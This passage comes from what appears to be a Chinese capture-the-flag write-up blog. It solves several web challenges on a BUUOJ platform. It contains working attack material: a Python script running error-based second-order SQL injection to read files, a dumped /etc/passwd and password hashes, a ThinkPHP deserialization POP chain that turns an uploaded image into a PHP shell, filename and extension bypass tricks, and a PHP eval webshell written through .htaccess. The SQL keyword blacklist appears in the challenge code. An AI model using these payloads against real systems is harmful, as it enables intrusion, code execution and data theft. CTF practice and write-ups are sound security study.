        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;修改收货地址&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;地址:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>delete.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单删除成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;删除订单&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;删除订单&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>confirm.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;
//var_dump($_POST);

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = $_POST[&quot;address&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if($fetch-&gt;num_rows&gt;0) {
        $msg = $user_name.&quot;已提交订单&quot;;
    }else{
        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
        $re = $db-&gt;prepare($sql);
        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
        $re = $re-&gt;execute();
        if(!$re) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单提交成功&quot;;
    }
} else {
    $msg = &quot;信息不全&quot;;
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;确认订单&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot;/&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
                &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
                &lt;/a&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>阅读代码发现,search处有sql注入,但是有以下限制:<code>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code></p>
<p>change处有明显的二次注入,无限制,但是是update</p>
<pre><code>&quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];</code></pre><p>我们利用报错注入来获取回显</p>
<pre><code>information_schema,test,performance_schema,ctftraining,mysql,ctfusers
ctftraining:FLAG_TABLE,news,users
FLAG_TABLE:FLAG_COLUMN
users:id,username,password,ip,time
news:id,title,content,time
ctfusers:user
user:user_id,address,old_address,user_name,phone</code></pre><pre><code>1dogThe domestic dog (Canis lupus familiaris when considered a subspecies of the wolf or Canis familiaris when considered a distinct species)[4] is a member of the genus Canis (canines), which forms part of the wolf-like canids,[5] and is the most widely abundant terrestrial carnivore.1571838684,2catThe cat or domestic cat (Felis catus) is a small carnivorous mammal.[1][2] 
It is the only domesticated species in the family Felidae.[4] The cat is either a house cat, kept as a pet, or a feral cat, freely ranging and avoiding human contact.1571838684,3birdBirds, also known as Aves, are a group of endothermic vertebrates, characterised by feathers, toothless beaked jaws, the laying of hard-shelled eggs, a high metabolic rate, a four-chambered heart, and a strong yet lightweight skeleton.1571838684,4flagFlag is in the database but not here.1571838684

1,admin,21232f297a57a5a743894a0e4a801fc3,127.0.0.1,1571838684,2,guest,084e0343a0486ff05530df6c705c8bb4,127.0.0.1,1571838684,3,virink,a4346e75cc1dd161a8d57f3b2d5d82d0,127.0.0.1,1571838684  </code></pre><p>/etc/passwd</p>
<pre><code>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin</code></pre><pre><code>dbf39bacca9e.log</code></pre><p>艹,最后百度下发现flag再flag.txt里面</p>
<p><code>flag{c90595fb-9a36-4257-ba55-9181d7584edc}</code></p>
<p>附上脚本:</p>
<pre><code class="python">import requests
import random
import re
import time
def sql_inj(sql):
    num=random.randint(0,9999999999)
    result=&quot;&quot;
    count=1
    while True:
        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/confirm.php&quot;
        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: &quot;&#39;+(updatexml(1,concat(0x7e,substr(({sql}),{count},30),0x7e),1))#&quot;.format(sql=sql,count=count)}
        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/change.php&quot;
        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/change.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: num}
        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        print(res.text)
        tmp=re.match(r&#39;.*~(.*)~.*&#39;,res.text,flags=re.DOTALL).group(1)
        result+=tmp
        print(result)
        if tmp.strip() is &quot;&quot;:
            break
        count+=30
        num+=1
        time.sleep(0.5)

sql_inj(&quot;SELECT (load_file(&#39;/flag.txt&#39;))&quot;)
</code></pre>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>报错后发现thinkphp的壳披着Discuz的皮,观察cookie发现,存在反序列化点</p>
<p>扫目录后,从<a href="http://www.tar.gz中拿到源码,从源码中很容易构造pop链" target="_blank" rel="noopener">www.tar.gz中拿到源码,从源码中很容易构造pop链</a></p>
<p>payload:</p>
<pre><code class="php">&lt;?php
namespace app\web\controller;
use think\Controller;

class Index extends Controller
{
    public $profile;
    public $profile_db;

    public function index()
    {
        if($this-&gt;login_check()){
            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;
            $this-&gt;redirect($curr_url,302);
            exit();
        }
        return $this-&gt;fetch(&quot;index&quot;);
    }

    public function home(){
        if(!$this-&gt;login_check()){
            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
            $this-&gt;redirect($curr_url,302);
            exit();
        }

        if(!$this-&gt;check_upload_img()){
            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);
            return $this-&gt;fetch(&quot;upload&quot;);
        }else{
            $this-&gt;assign(&quot;img&quot;,$this-&gt;profile_db[&#39;img&#39;]);
            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);
            return $this-&gt;fetch(&quot;home&quot;);
        }
    }

    public function login_check(){
        $profile=cookie(&#39;user&#39;);
        if(!empty($profile)){
            $this-&gt;profile=unserialize(base64_decode($profile));
            #$this-&gt;profile_db=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#39;ID&#39;]))-&gt;find();
            if(array_diff(array(1,1,1),$this-&gt;profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }

    public function check_upload_img(){
        if(!empty($this-&gt;profile) &amp;&amp; !empty($this-&gt;profile_db)){
            if(empty($this-&gt;profile_db[&#39;img&#39;])){
                return 0;
            }else{
                return 1;
            }
        }
    }

    public function logout(){
        cookie(&quot;user&quot;,null);
        $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
        $this-&gt;redirect($curr_url,302);
        exit();
    }

    public function test()
    {
        $a=urldecode(&quot;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&quot;);
        $b=substr($a,0,strlen($a)-1);
        $b=str_replace(&quot;\&quot;Error\&quot;:7&quot;,&quot;\&quot;Error\&quot;:8&quot;,$b);
        $b.=&quot;s:3:\&quot;aaa\&quot;;&quot;.serialize(new Register()).&quot;}&quot;;

        $b=&#39;a:6:{s:2:&quot;ID&quot;;i:9;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;N;s:5:&quot;email&quot;;s:11:&quot;cao0@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;74b87337454200d4d33f80c4663dc5e5&quot;;s:3:&quot;abc&quot;;&#39;.$b.&#39;}&#39;;
        #return &quot;a&quot;;
        return urlencode(base64_encode($b));
    }

    public function __get($name)
    {
        return url;
    }

}

</code></pre>
<pre><code class="php">&lt;?php
namespace app\web\controller;
use think\Controller;

class Register extends Controller
{
    public $checker;
    public $registed;

    public function __construct()
    {
        $this-&gt;registed=0;
        $this-&gt;checker=new Profile();
    }

    public function register()
    {
        if ($this-&gt;checker) {
            if($this-&gt;checker-&gt;login_check()){
                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;
                $this-&gt;redirect($curr_url,302);
                exit();
            }
        }
        if (!empty(input(&quot;post.username&quot;)) &amp;&amp; !empty(input(&quot;post.email&quot;)) &amp;&amp; !empty(input(&quot;post.password&quot;))) {
            $email = input(&quot;post.email&quot;, &quot;&quot;, &quot;addslashes&quot;);
            $password = input(&quot;post.password&quot;, &quot;&quot;, &quot;addslashes&quot;);
            $username = input(&quot;post.username&quot;, &quot;&quot;, &quot;addslashes&quot;);
            if($this-&gt;check_email($email)) {
                if (empty(db(&quot;user&quot;)-&gt;where(&quot;username&quot;, $username)-&gt;find()) &amp;&amp; empty(db(&quot;user&quot;)-&gt;where(&quot;email&quot;, $email)-&gt;find())) {
                    $user_info = [&quot;email&quot; =&gt; $email, &quot;password&quot; =&gt; md5($password), &quot;username&quot; =&gt; $username];
                    if (db(&quot;user&quot;)-&gt;insert($user_info)) {
                        $this-&gt;registed = 1;
                        $this-&gt;success(&#39;Registed successful!&#39;, url(&#39;../index&#39;));
                    } else {
                        $this-&gt;error(&#39;Registed failed!&#39;, url(&#39;../index&#39;));
                    }
                } else {
                    $this-&gt;error(&#39;Account already exists!&#39;, url(&#39;../index&#39;));
                }
            }else{
                $this-&gt;error(&#39;Email illegal!&#39;, url(&#39;../index&#39;));
            }
        } else {
            $this-&gt;error(&#39;Something empty!&#39;, url(&#39;../index&#39;));
        }
    }

    public function check_email($email){
        $pattern = &quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/&quot;;
        preg_match($pattern, $email, $matches);
        if(empty($matches)){
            return 0;
        }else{
            return 1;
        }
    }

    public function __destruct()
    {
        if(!$this-&gt;registed){
            $this-&gt;checker-&gt;index();
        }
    }


}</code></pre>
<pre><code class="php">&lt;?php
namespace app\web\controller;

use think\Controller;
class Profile extends Controller
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);
    public $index;

    public function __construct()
    {
        $this-&gt;index=&quot;upload_img&quot;;
        $this-&gt;checker=0;
        $this-&gt;ext=1;
        $this-&gt;filename_tmp=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png&quot;;
        $this-&gt;filename=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.php&quot;;
    }

    public function upload_img(){
        if($this-&gt;checker){
            if(!$this-&gt;checker-&gt;login_check()){
                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
                $this-&gt;redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;
            $this-&gt;ext_check();
        }
        if($this-&gt;ext) {
            if(getimagesize($this-&gt;filename_tmp)) {
                @copy($this-&gt;filename_tmp, $this-&gt;filename);
                @unlink($this-&gt;filename_tmp);
                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;
                $this-&gt;update_img();
            }else{
                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));
            }
        }else{
            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));
        }
    }

    public function update_img(){
        $user_info=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();
        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img){
            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){
                $this-&gt;update_cookie();
                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;../home&#39;));
            }else{
                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;../index&#39;));
            }
        }
    }

    public function update_cookie(){
        $this-&gt;checker-&gt;profile[&#39;img&#39;]=$this-&gt;img;
        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);
    }

    public function ext_check(){
        $ext_arr=explode(&quot;.&quot;,$this-&gt;filename);
        $this-&gt;ext=end($ext_arr);
        if($this-&gt;ext==&quot;png&quot;){
            return 1;
        }else{
            return 0;
        }
    }

    public function __get($name)
    {
        return $this-&gt;except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this-&gt;{$name}){
            $this-&gt;{$this-&gt;{$name}}($arguments);
        }
    }

}</code></pre>
<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>简单的smarty ssti</p>
<h2 id="Futurella"><a href="#Futurella" class="headerlink" title="Futurella"></a>Futurella</h2><p>F12</p>
<h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="2020 新春红包题 1"></a>2020 新春红包题 1</h2><p>和2019的eis中的pop一摸一样,我之前也做出来了,再看的时候居然不会了???????????</p>
<p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<p>唯一不同的是,这题会对文件名进行检测</p>
<pre><code class="php">public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;
        if(substr($cache_filename, -strlen(&#39;.php&#39;)) === &#39;.php&#39;) {
            die(&#39;?&#39;);
        }
        return $cache_filename;
    }</code></pre>
<p>我在这里卡了好久,还是去偷窥wp解决的</p>
<p>我们利用<code>uniqid()/../filename</code>来绕过uniqid,</p>
<p>利用<code>index.php/.</code>=<code>index.php</code>来绕过后缀名检测</p>
<p>其他解法: <a href="https://www.zhaoj.in/read-6397.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6397.html</a> </p>
<ol>
<li>利用.user.ini</li>
<li>利用shell中``的优先级大于”来命令执行</li>
</ol>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code class="php">&lt;?php
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    include_once(&quot;fl3g.php&quot;);
    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET[&#39;content&#39;];
    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
        echo &quot;Hacker&quot;;
        die();
    }
    $filename = $_GET[&#39;filename&#39;];
    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
        echo &quot;Hacker&quot;;
        die();
    }
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
?&gt;</code></pre>
<p>可以任意写文件,写个php文件后发现,不解析,估计是htaccess的,</p>
<p>于是写htaccess,利用<code>#\</code>来绕过末尾添加<code>\nJust one chance</code>,将其注释</p>
<p>最后的payload</p>
<pre><code>#&lt;?php die(eval($_POST[1]));?&gt;
